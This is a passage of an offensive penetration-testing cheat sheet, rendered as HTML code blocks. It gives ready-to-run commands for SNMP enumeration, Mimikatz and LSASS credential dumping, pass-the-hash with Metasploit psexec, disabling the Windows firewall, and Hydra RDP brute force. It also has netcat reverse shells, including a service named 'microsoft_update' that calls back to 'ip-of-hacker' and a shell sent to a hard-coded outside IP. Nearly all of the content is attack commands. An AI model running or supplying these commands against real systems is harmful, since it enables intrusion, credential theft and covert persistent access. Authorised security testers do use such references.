</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>enum4linux target
</span></code></pre></div>
<h3 id="snmp-enumeration">SNMP Enumeration:</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a># Enumerating SNMP on &#39;IP&#39; using different commands
</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>snmpget -v 1 -c public IP
</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>snmpwalk -v 1 -c public IP
</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP
</span></code></pre></div>
<h3 id="windows-commands">Windows Commands:</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a># Various Windows command-line operations
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>net localgroup Users
</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>net localgroup Administrators
</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>search dir/s *.doc
</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>system(&quot;start cmd.exe /k $cmd&quot;)
</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>sc create microsoft_update binpath=&quot;cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe&quot; start= auto error= ignore
</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779
</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;
</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a>Procdump.exe -accepteula -ma lsass.exe lsass.dmp
</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;
</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a>C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp 32
</span><span id="__span-16-12"><a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a>C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp 64
</span></code></pre></div>
<h2 id="tunneling-and-port-forwarding">Tunneling and Port Forwarding:</h2>
<h3 id="putty-remote-port-forwarding">PuTTY Remote Port Forwarding:</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a># Forward the remote port to the destination address using PuTTY
</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>plink.exe -P 22 -l root -pw &quot;1234&quot; -R 445:127.0.0.1:445 IP
</span></code></pre></div>
<h3 id="meterpreter-port-forwarding">Meterpreter Port Forwarding:</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a># Meterpreter port forwarding for remote access
</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a># For detailed usage, refer to https://www.offensive-security.com/metasploit-unleashed/portfwd/
</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>meterpreter &gt; portfwd add -l 3389 -p 3389 -r 172.16.194.141
</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>kali &gt; rdesktop 127.0.0.1:3389
</span></code></pre></div>
<h3 id="enabling-rdp-and-firewall-manipulation">Enabling RDP and Firewall Manipulation:</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a># Enable the RDP service and configure firewall settings
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>reg add &quot;hklm\system\currentcontrolset\control\terminal server&quot; /f /v fDenyTSConnections /t REG_DWORD /d 0
</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>netsh firewall set service remoteadmin enable
</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>netsh firewall set service remotedesktop enable
</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>
</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a># Close Windows Firewall
</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a>netsh firewall set opmode disable
</span></code></pre></div>
<h3 id="meterpreter-vncrdp">Meterpreter VNC/RDP:</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a># Enabling VNC/RDP with Meterpreter
</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a># For detailed usage, refer to https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/
</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>run getgui -u admin -p 1234
</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>run vnc -p 5043
</span></code></pre></div>
<h3 id="using-mimikatz">Using Mimikatz:</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a># Using Mimikatz to retrieve Windows plaintext user name and password
</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>git clone https://github.com/gentilkiwi/mimikatz.git
</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>privilege::debug
</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>sekurlsa::logonPasswords full
</span></code></pre></div>
<h1 id="password-hash-gathering-and-cracking">Password Hash Gathering and Cracking</h1>
<h2 id="gathering-password-hash">Gathering Password Hash:</h2>
<h3 id="using-pth-toolkit-and-pth-winexe">Using pth-toolkit and pth-winexe:</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a># Clone pth-toolkit and retrieve a shell using the hash
</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>git clone https://github.com/byt3bl33d3r/pth-toolkit
</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>pth-winexe -U hash //IP cmd
</span></code></pre></div>
<h3 id="using-xfreerdp">Using xfreerdp:</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a># Install freerdp-x11 and connect using a hash
</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>apt-get install freerdp-x11
</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP
</span></code></pre></div>
<h3 id="using-meterpreter">Using Meterpreter:</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a># Use Meterpreter to gather hashes
</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>meterpreter &gt; run post/windows/gather/hashdump
</span></code></pre></div>
<h2 id="exploiting-hash-to-gain-access">Exploiting Hash to Gain Access:</h2>
<h3 id="using-metasploit-psexec">Using Metasploit psexec:</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a># Set up a Meterpreter reverse shell using the hash
</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>msf &gt; use exploit/windows/smb/psexec
</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>msf exploit(psexec) &gt; set payload windows/meterpreter/reverse_tcp
</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>msf exploit(psexec) &gt; set SMBPass HASH
</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>msf exploit(psexec) &gt; exploit
</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a>meterpreter &gt; shell
</span></code></pre></div>
<h2 id="password-cracking-with-hashcat">Password Cracking with Hashcat:</h2>
<h3 id="using-hashcat">Using Hashcat:</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a># Crack passwords using Hashcat
</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>hashcat -m 400 -a 0 hash /root/rockyou.txt
</span></code></pre></div>
<h1 id="using-netcat-nc-for-shell-bouncing-on-windows">Using Netcat (NC) for Shell Bouncing on Windows</h1>
<h2 id="listening-and-connecting-with-nc">Listening and Connecting with NC:</h2>
<h3 id="setting-up-a-listener">Setting Up a Listener:</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a># Windows: Listen on port 31337 and execute cmd.exe
</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>c:&gt; nc -Lp 31337 -vv -e cmd.exe
</span></code></pre></div>
<h3 id="connecting-to-the-listener">Connecting to the Listener:</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a># Connect to the Windows listener on IP and port 31337
</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>nc 192.168.0.10 31337
</span></code></pre></div>
<h3 id="executing-shell-on-a-remote-host">Executing Shell on a Remote Host:</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a># Execute cmd.exe on a remote host via NC
</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>c:&gt; nc example.com 80 -e cmd.exe
</span></code></pre></div>
<h3 id="setting-up-a-listener-on-port-80">Setting Up a Listener on Port 80:</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a># Listen on port 80
</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>nc -lp 80
</span></code></pre></div>
<h2 id="advanced-nc-options">Advanced NC Options:</h2>
<h3 id="bouncing-shell-with-binbash">Bouncing Shell with /bin/bash:</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a># Bounce a shell on Windows using /bin/bash
</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>nc -lp 31337 -e /bin/bash
</span></code></pre></div>
<h3 id="randomize-output-and-wait">Randomize Output and Wait:</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a># Randomize output and wait for 1 second before exiting
</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>nc -vv -r -w 1 192.168.0.10 -z 1-1000
</span></code></pre></div>
<h1 id="finding-suidsgid-and-orphaned-files">Finding SUID/SGID and Orphaned Files</h1>
<h2 id="locate-suid-root-files">Locate SUID root files:</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a># Search for SUID root files
</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>find / -user root -perm -4000 -print
</span></code></pre></div>
<h2 id="locate-sgid-root-files">Locate SGID root files:</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a># Search for SGID root files
</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>find / -group root -perm -2000 -print
</span></code></pre></div>
<h2 id="locate-suid-and-sgid-files">Locate SUID and SGID files:</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a># Search for both SUID and SGID files
</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>find / -perm -4000 -o -perm -2000 -print
</span></code></pre></div>
<h2 id="find-files-that-do-not-belong-to-any-user">Find files that do not belong to any user:</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a># Search for files without an assigned user
</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>find / -nouser -print
</span></code></pre></div>
<h2 id="locate-files-that-do-not-belong-to-any-user-group">Locate files that do not belong to any user group:</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a># Search for files without an assigned user group
</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>find / -nogroup -print
</span></code></pre></div>
<h2 id="find-symbolic-links-and-display-their-targets">Find symbolic links and display their targets:</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a># Search for symbolic links and show their targets
</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>find / -type l -ls
</span></code></pre></div>
<h2 id="python-shell-escalation">Python Shell Escalation:</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a># Escalate to a Python shell
</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
</span></code></pre></div>
<h1 id="python-ruby-and-php-http-servers">Python, Ruby, and PHP HTTP Servers:</h1>
<h2 id="python-2-http-server">Python 2 HTTP Server:</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a># Start a Python 2 HTTP server
</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>python2 -m SimpleHTTPServer
</span></code></pre></div>
<h2 id="python-3-http-server">Python 3 HTTP Server:</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a># Start a Python 3 HTTP server
</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>python3 -m http.server
</span></code></pre></div>
<h2 id="ruby-http-server-webrick">Ruby HTTP Server (WEBrick):</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a># Start a Ruby WEBrick HTTP server on port 8888
</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>ruby -rwebrick -e &#39;WEBrick::HTTPServer.new(:Port =&gt; 8888, :DocumentRoot =&gt; Dir.pwd).start&#39;
</span></code></pre></div>
<h2 id="php-http-server">PHP HTTP Server:</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a># Start a PHP HTTP server on IP 0.0.0.0 and port 8888
</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>php -S 0.0.0.0:8888
</span></code></pre></div>
<h1 id="getting-process-pid">Getting Process PID:</h1>
<h2 id="find-pid-for-a-port">Find PID for a Port:</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a># Get the PID for a process using port 80
</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>fuser -nv tcp 80
</span></code></pre></div>
<h2 id="kill-a-process-by-port">Kill a Process by Port:</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a># Kill the process using port 80
</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>fuser -k -n tcp 80
</span></code></pre></div>
<h1 id="using-hydra-to-crack-rdp">Using Hydra to Crack RDP:</h1>
<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a># Use Hydra to crack RDP with a username list and password file
</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a>hydra -l admin -P /root/Desktop/passwords -t 1 -vV -f -o hydra_output.txt rdp://X.X.X.X
</span></code></pre></div>
<h1 id="mounting-a-remote-windows-shared-folder-smb">Mounting a Remote Windows Shared Folder (SMB):</h1>
<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a># Mount a remote Windows shared folder to /mnt/remote/
</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw
</span></code></pre></div>
<h1 id="compiling-an-exploit-in-kali">Compiling an Exploit in Kali:</h1>
<h2 id="compile-a-32-bit-executable">Compile a 32-bit Executable:</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a># Compile a 32-bit executable from hello.c
</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a>gcc -m32 -o output32 hello.c
</span></code></pre></div>
<h2 id="compile-a-64-bit-executable">Compile a 64-bit Executable:</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a># Compile a 64-bit executable from hello.c
</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>gcc -m64 -o output hello.c
</span></code></pre></div>
<h1 id="compiling-a-windows-exploit-in-kali">Compiling a Windows Exploit in Kali:</h1>
<div class="language-text highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a># Download and install MinGW
</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download
</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a>wine mingw-get-setup.exe
</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a># Select mingw32-base during installation
</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a># Navigate to the MinGW bin directory
</span><span id="__span-50-6"><a id="__codelineno-50-6" name="__codelineno-50-6" href="#__codelineno-50-6"></a>cd /root/.wine/drive_c/windows
</span><span id="__span-50-7"><a id="__codelineno-50-7" name="__codelineno-50-7" href="#__codelineno-50-7"></a>wget http://gojhonny.com/misc/mingw_bin.zip &amp;&amp; unzip mingw_bin.zip
</span><span id="__span-50-8"><a id="__codelineno-50-8" name="__codelineno-50-8" href="#__codelineno-50-8"></a>cd /root/.wine/drive_c/MinGW/bin
</span><span id="__span-50-9"><a id="__codelineno-50-9" name="__codelineno-50-9" href="#__codelineno-50-9"></a># Compile the exploit.c to ability.exe with necessary libraries
</span><span id="__span-50-10"><a id="__codelineno-50-10" name="__codelineno-50-10" href="#__codelineno-50-10"></a>wine gcc -o ability.exe /tmp/exploit.c -lwsock32
</span><span id="__span-50-11"><a id="__codelineno-50-11" name="__codelineno-50-11" href="#__codelineno-50-11"></a># Execute the compiled Windows exploit
</span><span id="__span-50-12"><a id="__codelineno-50-12" name="__codelineno-50-12" href="#__codelineno-50-12"></a>wine ability.exe
</span></code></pre></div>
<h1 id="nasm-netwide-assembler-commands">NASM (Netwide Assembler) Commands:</h1>
<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a># Assemble an assembly source file to binary
</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>nasm -f bin -o payload.bin payload.asm
</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a>
</span><span id="__span-51-4"><a id="__codelineno-51-4" name="__codelineno-51-4" href="#__codelineno-51-4"></a># Assemble to ELF format and link, then display the disassembled code
</span><span id="__span-51-5"><a id="__codelineno-51-5" name="__codelineno-51-5" href="#__codelineno-51-5"></a>nasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload
</span></code></pre></div>
<h1 id="ssh-penetration">SSH Penetration:</h1>
<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a># SSH tunnel with dynamic port forwarding on local port 1080
</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>ssh -D 127.0.0.1:1080 -p 22 user@IP
</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a>
</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a># Add SOCKS4 proxy configuration to /etc/proxychains.conf
</span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a># Append: socks4 127.0.0.1 1080
</span><span id="__span-52-6"><a id="__codelineno-52-6" name="__codelineno-52-6" href="#__codelineno-52-6"></a>
</span><span id="__span-52-7"><a id="__codelineno-52-7" name="__codelineno-52-7" href="#__codelineno-52-7"></a># Use proxychains to route commands through the SSH tunnel
</span><span id="__span-52-8"><a id="__codelineno-52-8" name="__codelineno-52-8" href="#__codelineno-52-8"></a>proxychains commands target
</span><span id="__span-52-9"><a id="__codelineno-52-9" name="__codelineno-52-9" href="#__codelineno-52-9"></a>
</span><span id="__span-52-10"><a id="__codelineno-52-10" name="__codelineno-52-10" href="#__codelineno-52-10"></a># SSH penetration from one network to another, chaining multiple SSH connections
</span><span id="__span-52-11"><a id="__codelineno-52-11" name="__codelineno-52-11" href="#__codelineno-52-11"></a>
</span><span id="__span-52-12"><a id="__codelineno-52-12" name="__codelineno-52-12" href="#__codelineno-52-12"></a># First SSH tunnel with dynamic port forwarding
</span><span id="__span-52-13"><a id="__codelineno-52-13" name="__codelineno-52-13" href="#__codelineno-52-13"></a>ssh -D 127.0.0.1:1080 -p 22 user1@IP1
</span><span id="__span-52-14"><a id="__codelineno-52-14" name="__codelineno-52-14" href="#__codelineno-52-14"></a>
</span><span id="__span-52-15"><a id="__codelineno-52-15" name="__codelineno-52-15" href="#__codelineno-52-15"></a># Add SOCKS4 proxy configuration to /etc/proxychains.conf
</span><span id="__span-52-16"><a id="__codelineno-52-16" name="__codelineno-52-16" href="#__codelineno-52-16"></a># Append: socks4 127.0.0.1 1080
</span><span id="__span-52-17"><a id="__codelineno-52-17" name="__codelineno-52-17" href="#__codelineno-52-17"></a>
</span><span id="__span-52-18"><a id="__codelineno-52-18" name="__codelineno-52-18" href="#__codelineno-52-18"></a># Second SSH tunnel with dynamic port forwarding through the first tunnel
</span><span id="__span-52-19"><a id="__codelineno-52-19" name="__codelineno-52-19" href="#__codelineno-52-19"></a>proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2
</span><span id="__span-52-20"><a id="__codelineno-52-20" name="__codelineno-52-20" href="#__codelineno-52-20"></a>
</span><span id="__span-52-21"><a id="__codelineno-52-21" name="__codelineno-52-21" href="#__codelineno-52-21"></a># Add SOCKS4 proxy configuration to /etc/proxychains.conf
</span><span id="__span-52-22"><a id="__codelineno-52-22" name="__codelineno-52-22" href="#__codelineno-52-22"></a># Append: socks4 127.0.0.1 1081
</span><span id="__span-52-23"><a id="__codelineno-52-23" name="__codelineno-52-23" href="#__codelineno-52-23"></a>
</span><span id="__span-52-24"><a id="__codelineno-52-24" name="__codelineno-52-24" href="#__codelineno-52-24"></a># Use proxychains to route commands through the second SSH tunnel
</span><span id="__span-52-25"><a id="__codelineno-52-25" name="__codelineno-52-25" href="#__codelineno-52-25"></a>proxychains commands target
</span></code></pre></div>
<h1 id="using-metasploit-for-penetration">Using Metasploit for Penetration</h1>
<p>Metasploit is a powerful penetration testing tool that provides a wide range of functionalities for identifying vulnerabilities and executing exploits. Here are some useful Metasploit commands and techniques:</p>
<ol>
<li><strong>IP Configuration and Routing:</strong></li>
<li>
<p>Description: Obtain the IP address of the compromised system, configure routing, and pivot through it.
 <div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>  meterpreter &gt; ipconfig
</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a>  IP Address: 10.1.13.3
</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a>  meterpreter &gt; run autoroute -s 10.1.13.0/24
</span><span id="__span-53-4"><a id="__codelineno-53-4" name="__codelineno-53-4" href="#__codelineno-53-4"></a>  meterpreter &gt; run autoroute -p
</span><span id="__span-53-5"><a id="__codelineno-53-5" name="__codelineno-53-5" href="#__codelineno-53-5"></a>  10.1.13.0 255.255.255.0 Session 1
</span></code></pre></div></p>
</li>
<li>
<p><strong>Exploiting Remote Systems:</strong></p>
</li>
<li>
<p>Description: Exploit a remote Windows system using the SMB psexec exploit module.
 <div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>  meterpreter &gt; Ctrl+Z
</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a>  msf auxiliary(tcp) &gt; use exploit/windows/smb/psexec
</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a>  msf exploit(psexec) &gt; set RHOST 10.1.13.2
</span><span id="__span-54-4"><a id="__codelineno-54-4" name="__codelineno-54-4" href="#__codelineno-54-4"></a>  msf exploit(psexec) &gt; exploit
</span><span id="__span-54-5"><a id="__codelineno-54-5" name="__codelineno-54-5" href="#__codelineno-54-5"></a>  meterpreter &gt; ipconfig
</span><span id="__span-54-6"><a id="__codelineno-54-6" name="__codelineno-54-6" href="#__codelineno-54-6"></a>  IP Address: 10.1.13.2
</span></code></pre></div></p>
</li>
<li>
<p><strong>Exploit-DB Search:</strong></p>
</li>
<li>
<p>Description: Search for exploits in the Exploit-DB database based on keywords or criteria.
 <div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>  git clone https://github.com/offensive-security/exploit-database.git
